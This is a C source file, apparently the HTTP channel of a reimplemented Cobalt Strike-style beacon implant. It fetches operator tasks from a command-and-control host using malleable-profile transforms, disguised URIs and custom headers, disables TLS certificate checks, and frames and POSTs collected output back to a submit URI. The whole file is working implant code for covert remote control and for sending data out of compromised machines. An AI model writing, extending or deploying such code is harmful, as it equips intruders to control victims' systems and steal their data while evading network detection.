#include "channel.h"
#include "beacon.h"
#include "profile.h"
#include "debug.h"
#include <arpa/inet.h>
#include <curl/curl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>

/* portable case-insensitive prefix match (avoid strings.h) */
static int header_is_ua(const char *line) {
    const char *p = "user-agent:";
    while (*p && *line) {
        if (tolower((unsigned char)*line) != (unsigned char)*p)
            return 0;
        p++;
        line++;
    }
    return *p == '\0';
}

#define MAX_HTTP_POST (2 * 1024 * 1024)

static char *http_post_buffer;
static int   http_post_len;

static size_t write_cb(void *contents, size_t size, size_t nmemb, void *userp) {
    size_t realsize = size * nmemb;
    http_response_t *r = (http_response_t *)userp;
    char *p = realloc(r->data, r->size + realsize + 1);
    if (!p) return 0;
    r->data = p;
    memcpy(r->data + r->size, contents, realsize);
    r->size += realsize;
    r->data[r->size] = 0;
    return realsize;
}

void http_response_free(http_response_t *r) {
    if (!r) return;
    free(r->data);
    r->data = NULL;
    r->size = 0;
}

/* DOMAINS: host,uri,host,uri,... (BeaconPayload.exportBeaconStage) */
static void pick_host_uri(char *host, size_t hsz, char *uri, size_t usz) {
    char *domains = setting_ptr(SETTING_DOMAINS);
    const char *def_host = "127.0.0.1";
    const char *def_uri  = "/en_US/all.js";
    if (!domains || !domains[0]) {
        snprintf(host, hsz, "%s", def_host);
        snprintf(uri, usz, "%s", def_uri);
        return;
    }
    {
        char tmp[512];
        char *comma;
        char *comma2;
        snprintf(tmp, sizeof(tmp), "%s", domains);
        comma = strchr(tmp, ',');
        if (comma) {
            *comma = 0;
            snprintf(host, hsz, "%s", tmp);
            comma2 = strchr(comma + 1, ',');
            if (comma2) *comma2 = 0;
            snprintf(uri, usz, "%s", comma + 1);
        } else {
            snprintf(host, hsz, "%s", tmp);
            snprintf(uri, usz, "%s", def_uri);
        }
    }
}

static void setup_ssl(CURL *curl, int https) {
    if (https) {
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    }
}

/*
 * Split profile.headers ("Name: value\r\n...") into curl_slist.
 * Also add Accept / Connection / Cache-Control like WinINet path helpers.
 */
static struct curl_slist *headers_from_profile(const profile_t *prof, const char *ua) {
    struct curl_slist *list = NULL;
    char *copy;
    char *line;
    char *save = NULL;
    char uah[512];

    list = curl_slist_append(list, "Accept: */*");
    list = curl_slist_append(list, "Connection: Keep-Alive");
    list = curl_slist_append(list, "Cache-Control: no-cache");

    if (ua && ua[0]) {
        snprintf(uah, sizeof(uah), "User-Agent: %s", ua);
        list = curl_slist_append(list, uah);
    }

    if (!prof || !prof->headers || !prof->headers[0])
        return list;

    copy = strdup(prof->headers);
    if (!copy) return list;

    for (line = strtok_r(copy, "\r\n", &save); line; line = strtok_r(NULL, "\r\n", &save)) {
        if (line[0] == '\0') continue;
        /* Skip UA if profile also emits it — settings UA already set */
        if (header_is_ua(line))
            continue;
        list = curl_slist_append(list, line);
    }
    free(copy);
    return list;
}

/*
 * Official channel._http_get:
 *   profile_setup → uri = hook
 *   apply(C2_REQUEST, meta, NULL)
 *   request URI = uri + parameters
 *   headers = profile.headers, body = profile.buffer
 *   recover(C2_RECOVER) on response body
 */
int channel_http_get(const char *uri_override, const sessdata *meta, http_response_t *resp) {
    CURL *curl;
    char host[256], base_uri[256], url[2048], myuri[2048];
    char *ua = setting_ptr(SETTING_USERAGENT);
    char *verb = setting_ptr(SETTING_C2_VERB_GET);
    char *prog_req = setting_ptr(SETTING_C2_REQUEST);
    char *prog_rec = setting_ptr(SETTING_C2_RECOVER);
    int len_req = (int)setting_len(SETTING_C2_REQUEST);
    int len_rec = (int)setting_len(SETTING_C2_RECOVER);
    int port = setting_short(SETTING_PORT);
    int https = IS_HTTPS;
    struct curl_slist *headers = NULL;
    long code = 0;
    profile_t prof;
    int meta_len;
    int recovered;

    resp->data = NULL;
    resp->size = 0;

    pick_host_uri(host, sizeof(host), base_uri, sizeof(base_uri));
    if (uri_override && uri_override[0])
        snprintf(base_uri, sizeof(base_uri), "%s", uri_override);

    meta_len = (meta && meta->length > 0) ? meta->length : 0;
    profile_setup(&prof, meta_len > 0 ? meta_len : 256);
    if (!prof.temp) {
        profile_free(&prof);
        return -1;
    }

    snprintf(prof.uri, 1024, "%s", base_uri);

    apply(prog_req, len_req, &prof,
          meta && meta_len > 0 ? (char *)meta->data : NULL, meta_len,
          NULL, 0);

    if (!prof.parameters[0])
        snprintf(myuri, sizeof(myuri), "%s", prof.uri);
    else
        snprintf(myuri, sizeof(myuri), "%s%s", prof.uri, prof.parameters);

    snprintf(url, sizeof(url), "%s://%s:%d%s",
             https ? "https" : "http", host, port ? port : 80, myuri);

    curl = curl_easy_init();
    if (!curl) {
        profile_free(&prof);
        return -1;
    }

    headers = headers_from_profile(&prof, ua);

    curl_easy_setopt(curl, CURLOPT_URL, url);
    if (verb && verb[0])
        curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, verb);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_cb);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, resp);
    curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 10L);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 90L);
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
    if (prof.blen > 0 && prof.buffer) {
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, prof.buffer);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, (long)prof.blen);
    }
    setup_ssl(curl, https);

    DEBUG_PRINT("[http] GET %s headers_len=%zu body=%d\n",
                url, prof.headers ? strlen(prof.headers) : 0, prof.blen);

    if (curl_easy_perform(curl) != CURLE_OK) {
        curl_slist_free_all(headers);
        curl_easy_cleanup(curl);
        profile_free(&prof);
        http_response_free(resp);
        return -1;
    }
    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &code);
    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
    profile_free(&prof);

    if (code != 200) {
        DEBUG_PRINT("[http] GET status %ld\n", code);
        http_response_free(resp);
        return -1;
    }

    /* Empty body is a valid idle check-in */
    if (!resp->data || resp->size == 0)
        return 0;

    /* recover mutates buffer in place (official channel.cpp).
     * 0 = empty / failed transform → treat as idle check-in (no tasks). */
    {
        size_t cap = resp->size + 64;
        char *buf = realloc(resp->data, cap);
        if (!buf) {
            http_response_free(resp);
            return -1;
        }
        resp->data = buf;
        recovered = recover(prog_rec, len_rec, resp->data, (int)resp->size, (int)cap - 1);
        if (recovered < 0)
            recovered = 0;
        resp->size = (size_t)recovered;
        resp->data[resp->size] = 0;
        DEBUG_PRINT("[http] recover -> %d bytes\n", recovered);
    }
    return 0;
}

/*
 * Official http_post_maybe:
 *   apply(C2_POSTREQ, id_string, post_buffer)
 *   URI = uri + parameters; body = profile.buffer
 */
int channel_http_post(const char *uri_override, const char *agent_id,
                      const uint8_t *body, size_t body_len, http_response_t *resp) {
    CURL *curl;
    char host[256], base_uri[256], url[2048], myuri[2048];
    char *ua = setting_ptr(SETTING_USERAGENT);
    char *submit = setting_ptr(SETTING_SUBMITURI);
    char *verb = setting_ptr(SETTING_C2_VERB_POST);
    char *prog_post = setting_ptr(SETTING_C2_POSTREQ);
    int len_post = (int)setting_len(SETTING_C2_POSTREQ);
    int port = setting_short(SETTING_PORT);
    int https = IS_HTTPS;
    struct curl_slist *headers = NULL;
    long code = 0;
    profile_t prof;
    char idbuf[64];
    int idlen;

    resp->data = NULL;
    resp->size = 0;

    pick_host_uri(host, sizeof(host), base_uri, sizeof(base_uri));
    if (submit && submit[0])
        snprintf(base_uri, sizeof(base_uri), "%s", submit);
    if (uri_override && uri_override[0])
        snprintf(base_uri, sizeof(base_uri), "%s", uri_override);

    snprintf(idbuf, sizeof(idbuf), "%s", agent_id ? agent_id : "0");
    idlen = (int)strlen(idbuf);

    profile_setup(&prof, body_len > 0 ? (int)body_len : 256);
    if (!prof.temp) {
        profile_free(&prof);
        return -1;
    }
    snprintf(prof.uri, 1024, "%s", base_uri);

    apply(prog_post, len_post, &prof, idbuf, idlen,
          body && body_len ? (char *)body : NULL, (int)body_len);

    if (!prof.parameters[0])
        snprintf(myuri, sizeof(myuri), "%s", prof.uri);
    else
        snprintf(myuri, sizeof(myuri), "%s%s", prof.uri, prof.parameters);

    snprintf(url, sizeof(url), "%s://%s:%d%s",
             https ? "https" : "http", host, port ? port : 80, myuri);

    curl = curl_easy_init();
    if (!curl) {
        profile_free(&prof);
        return -1;
    }

    headers = headers_from_profile(&prof, ua);
    /* Default Content-Type if profile didn't set one and we have a body */
    if (prof.blen > 0) {
        int has_ct = 0;
        if (prof.headers && strstr(prof.headers, "Content-Type:"))
            has_ct = 1;
        if (!has_ct)
            headers = curl_slist_append(headers, "Content-Type: application/octet-stream");
    }

    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_POST, 1L);
    if (verb && verb[0] && strcmp(verb, "POST") != 0)
        curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, verb);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_cb);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, resp);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 60L);
    if (prof.blen > 0 && prof.buffer) {
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, prof.buffer);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, (long)prof.blen);
    } else {
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, "");
        curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, 0L);
    }
    setup_ssl(curl, https);

    DEBUG_PRINT("[http] POST %s body=%d\n", url, prof.blen);

    if (curl_easy_perform(curl) != CURLE_OK) {
        curl_slist_free_all(headers);
        curl_easy_cleanup(curl);
        profile_free(&prof);
        return -1;
    }
    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &code);
    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
    profile_free(&prof);
    return code == 200 ? 0 : -1;
}

void http_put(const char *uri, void *buffer, int len, int post_now) {
    uint32_t flen;
    (void)uri;
    if (len <= 0 || !buffer) return;
    if (!http_post_buffer) {
        http_post_buffer = (char *)malloc(MAX_HTTP_POST);
        http_post_len = 0;
    }
    if (!http_post_buffer) return;
    if ((http_post_len + len + 4) > MAX_HTTP_POST)
        http_post_flush(uri);
    flen = htonl((uint32_t)len);
    memcpy(http_post_buffer + http_post_len, &flen, 4);
    http_post_len += 4;
    memcpy(http_post_buffer + http_post_len, buffer, (size_t)len);
    http_post_len += len;
    if (post_now) http_post_flush(uri);
}

void http_post_flush(const char *uri) {
    http_response_t resp;
    char id[32];
    char *submit = setting_ptr(SETTING_SUBMITURI);
    if (http_post_len <= 0 || !http_post_buffer) return;
    snprintf(id, sizeof(id), "%d", bigsession.myid);
    channel_http_post(uri ? uri : submit, id,
                      (uint8_t *)http_post_buffer, (size_t)http_post_len, &resp);
    http_response_free(&resp);
    http_post_len = 0;
}
